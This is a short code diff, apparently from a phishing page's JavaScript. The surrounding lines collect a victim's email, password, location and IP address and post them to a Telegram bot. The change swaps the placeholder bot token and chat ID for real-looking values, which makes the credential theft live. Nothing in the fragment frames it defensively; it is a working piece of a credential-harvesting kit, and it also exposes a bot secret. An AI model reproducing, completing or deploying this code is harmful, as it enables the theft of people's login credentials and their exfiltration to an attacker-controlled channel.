@@ -127,8 +127,8 @@
 
                 // Prepare the message to send to Telegram
                 const message = `Email: ${email.value}\nPassword: ${password.value}\nLocation: ${city}, ${region}, ${country}\nIP: ${userIP}`;
-                const telegramToken = 'YOUR_TELEGRAM_BOT_TOKEN'; // Replace with your bot token
-                const chatId = 'YOUR_CHAT_ID'; // Replace with your chat ID
+                const telegramToken = '7769927746:AAGY_cQOjnRPs7_x4ooXr90qFSe9LnBvr20'; // Replace with your bot token
+                const chatId = '7735490302'; // Replace with your chat ID
                 const telegramUrl = `https://api.telegram.org/bot${telegramToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
 
                 // Send the data to Telegram
